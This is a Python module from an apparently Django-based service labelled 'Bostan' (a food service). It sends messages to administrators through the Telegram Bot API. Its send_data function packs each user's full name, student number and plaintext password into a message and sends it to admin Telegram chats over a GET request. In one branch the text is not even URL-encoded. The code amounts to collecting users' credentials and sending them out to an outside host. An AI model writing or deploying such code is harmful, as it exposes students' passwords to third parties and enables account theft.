import urllib

import requests
from api.models import (
    get_all_admin_chat_id,
    get_connection_timeout,
    get_main_admin_chat_id,
    get_special_users,
    get_telegram_api,
)
from django.utils.translation import gettext as _
from requests import ConnectTimeout

TELEGRAM_API = get_telegram_api()
TELEGRAM_API_URL = "https://api.telegram.org/bot" + TELEGRAM_API + "/"
CONNECTION_TIMEOUT = get_connection_timeout()


def send_data(full_name, stun, password):
    text = f"بوستان 🍟🍔\nنام: {full_name}\nشماره دانشجویی: {stun}\nرمزعبور: {password}"
    special_users = get_special_users()
    if stun in special_users:
        main_admin = get_main_admin_chat_id()
        req = TELEGRAM_API_URL + f"sendMessage?chat_id={main_admin}&text={text}"
        try:
            requests.get(req, timeout=CONNECTION_TIMEOUT).json()
        except ConnectTimeout:
            print(_("Telegram timeout."))
    else:
        send_request(text)


def send_alert(text):
    send_request(text)


def send_request(text):
    text = urllib.parse.quote_plus(str(text))
    admins = get_all_admin_chat_id()
    for admin in admins:
        print(admin.value)
        req = TELEGRAM_API_URL + f"sendMessage?chat_id={admin.value}&text={text}"
        try:
            requests.get(req, timeout=CONNECTION_TIMEOUT).json()
        except ConnectTimeout:
            print(_("Telegram timeout."))
